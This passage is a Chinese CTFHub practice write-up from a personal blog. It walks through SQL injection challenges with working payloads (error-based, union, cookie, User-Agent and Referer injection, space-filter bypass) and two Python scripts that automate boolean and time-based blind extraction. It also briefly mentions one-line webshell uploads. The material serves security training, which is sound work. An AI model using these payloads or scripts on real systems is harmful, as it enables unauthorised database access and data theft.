+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;)),3)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092458129.png" alt="image-20230308092458129"></p>
+<p>得到sqli库中两个表：flag，news</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,(select * from sqli.flag)),3)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308092916770.png" alt="image-20230308092916770"></p>
+<p>此时仅显示了前一部分的flag，原因是updatexml函数最多只能显示32位字符的长度，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(0x7e,mid((select * from sqli.flag),20,32)),3)</span><br></pre></td></tr></table></figure>
+
+<p>查到了第20-32位的flag</p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230308093231337.png" alt="image-20230308093231337"></p>
+<p>拼起来就得到了完整flag</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>关键点是if判断：	</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。</span><br></pre></td></tr></table></figure>
+
+<p>利用substr函数，截取字符串（库名、表名、数据）并放入expr1中进行判断，从而得出正确值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr(database(),1,1)=&#x27;s&#x27;,1,(select table_name from information_schema.tables))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309083311747.png" alt="image-20230309083311747"></p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309083339235.png" alt="image-20230309083339235"></p>
+<p>显然，数据库的第一个字符为s</p>
+<p>有python脚本遍历</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="built_in">input</span>(<span class="string">&#x27;输入url:\n&#x27;</span>)</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():<span class="comment">#查库名</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#数据库名限制为64字符，但一般小于9，为了效率</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:<span class="comment">#linux下mysql应该是对大小写敏感的，而windows则不</span></span><br><span class="line">			url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">			r = requests.get(url)</span><br><span class="line">			<span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">				database_name = database_name+i</span><br><span class="line">				<span class="built_in">print</span>(database_name)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,database_name)</span><br><span class="line"></span><br><span class="line">get_database_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():<span class="comment">#查表名</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#看前四个表</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#一般来说表的最大长度有64</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table_list.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_list)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():<span class="comment">#查列</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#判断列里最多有4个字段</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#判断一个字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27;</span> %(k,j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_list.append(name)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,column_list)</span><br><span class="line"></span><br><span class="line">get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#判断一个值最多有51个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">126</span>):<span class="comment">#ascii48-126对应的数字+英文+&#123;,&#125;,|</span></span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&#x27;</span> %(j,i)</span><br><span class="line">                r=requests.get(url)</span><br><span class="line">                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:</span><br><span class="line">                    flag=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;flag:&#x27;</span>,flag)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230309093514036.png" alt="image-20230309093514036"></p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>方法和布尔盲注类似，利用if判断，但需要引入sleep()函数，从是否执行sleep()函数来判断if条件是否成立</p>
+<p>例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;=2,sleep(1),1)</span><br></pre></td></tr></table></figure>
+
+<p>如果数据库名字大于等于二，则返回时间应该大于1</p>
+<p>脚本与布尔盲注的脚本类似，只不过需要引入time库</p>
+<p>由于网络环境的波动，一般要跑三次</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urlOPEN = <span class="built_in">input</span>(<span class="string">&#x27;输入url:\n&#x27;</span>)</span><br><span class="line">mark = <span class="string">&#x27;query_success&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table_list = []</span><br><span class="line">column_list = []</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():<span class="comment">#查库名</span></span><br><span class="line">    <span class="keyword">global</span> database_name</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#数据库名限制为64字符，但一般小于9，为了效率</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:<span class="comment">#linux下mysql应该是对大小写敏感的，而windows则不</span></span><br><span class="line">            url = urlOPEN+<span class="string">&#x27;if(substr(database(),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(j,i)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            t = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                database_name = database_name+i</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,database_name)</span><br><span class="line"></span><br><span class="line">get_database_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():<span class="comment">#查表名</span></span><br><span class="line">    <span class="keyword">global</span> table_list</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#看前四个表</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):<span class="comment">#一般来说表的最大长度有64</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url = urlOPEN+<span class="string">&#x27;if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(k,j,i)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                t = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                    name = name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        table_list.append(name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_list)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():<span class="comment">#查列</span></span><br><span class="line">    <span class="keyword">global</span> column_list</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>): <span class="comment">#判断列里最多有4个字段</span></span><br><span class="line">        name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>): <span class="comment">#判断一个字段名最多有9个字符组成</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklnmopqrstuvwxyz&#x27;</span>:</span><br><span class="line">                url=urlOPEN+<span class="string">&#x27;if(substr((select column_name from information_schema.columns where table_name=&quot;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&quot;,sleep(1),1)&#x27;</span> %(k,j,i)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(url)</span><br><span class="line">                end_time = time.time()</span><br><span class="line">                t = end_time - start_time</span><br><span class="line">                <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                    name=name+i</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_list.append(name)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;column_name:&#x27;</span>,column_list)</span><br><span class="line"></span><br><span class="line">get_column_name()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>): <span class="comment">#判断一个值最多有51个字符组成</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">126</span>):<span class="comment">#ascii48-126对应的数字+英文+&#123;,&#125;,|</span></span><br><span class="line">            url=urlOPEN+<span class="string">&#x27;if(ascii(substr((select flag from flag),%d,1))=%d,sleep(1),1)&#x27;</span> %(j,i)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            t = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> (t &gt; <span class="number">1</span>):</span><br><span class="line">                flag=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;flag:&#x27;</span>,flag)</span><br><span class="line">    </span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure>
+
+<p>还是用sqlmap吧，够没脑子的</p>
+<h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p>本质就是整数型注入</p>
+<p>用<code>1 and 1=1</code>判断出，然后union select 联合注入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095151777.png" alt="image-20230310095151777"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;fddqhlosgo&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095210033.png" alt="image-20230310095210033"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,umremmalnq from sqli.fddqhlosgo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095301878.png" alt="image-20230310095301878"></p>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>提示是cookie注入，随便发点cookie过去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262211721.png" alt="image-202303262211721"></p>
+<p>那就发cookie id过去</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262214650.png" alt="image-20230326221312259"></p>
+<p>显然是普通的数字注入，order by尝试之后有两列</p>
+<p>那就用一般的联合注入union select</p>
+<p>构造id&#x3D;-1 union select 1,code查找</p>
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262216303.png" alt="image-20230326221603268"></p>
+<p>已经成功注入了，看得出来数据库是sqli</p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217257.png" alt="image-20230326221717225"></p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217179.png" alt="image-20230326221754150"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;gpdznzrugt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262218763.png" alt="image-20230326221827733"></p>
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,rgbrnkhfep from sqli.gpdznzrugt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262219457.png" alt="image-20230326221914424"></p>
+<h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082200993.png" alt="image-20230508220028924"></p>
+<p>用hackbar重新发一遍请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent=-1 union select database(),1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082203345.png" alt="image-20230508220334316"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent=-1 union select group_concat(table_name),1 from information_schema.tables where table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent=-1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#x27;nnzwsnydwo&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent=-1 union select pekzosqxfm,1 from sqli.nnzwsnydwo#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082210184.png" alt="image-20230508221053144"></p>
+<h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p>同UA</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer=-1 union select group_concat(table_name),1 from information_schema.tables where table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer=-1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#x27;uakovlxjab&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer=-1 union select hkjndazhbu,1 from sqli.uakovlxjab#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082216660.png" alt="image-20230508221601615"></p>
+<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>常见的有&#x2F;**&#x2F;,(),%0a</p>
+<p>经尝试可以用&#x2F;**&#x2F;绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/database(),1#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name),1/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name),1/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;vihvhlsoyv&#x27;#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1/**/union/**/select/**/kfqwbuiugf,1/**/from/**/sqli.vihvhlsoyv#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082229910.png" alt="image-20230508222955876"></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>一句话木马</p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230228103421787.png" alt="image-20230228103421787"></p>
+<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230228103436838.png" alt="image-20230228103436838"></p>
+<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>禁用js之后一句话🐴</p>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/04/12/ctfhub%E7%BB%83%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctfhub/" rel="tag">ctfhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/04/16/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            PHP原生类
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/04/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">php魔术方法</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2023
+        <i class="ri-heart-fill heart_icon"></i> b1xcy
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
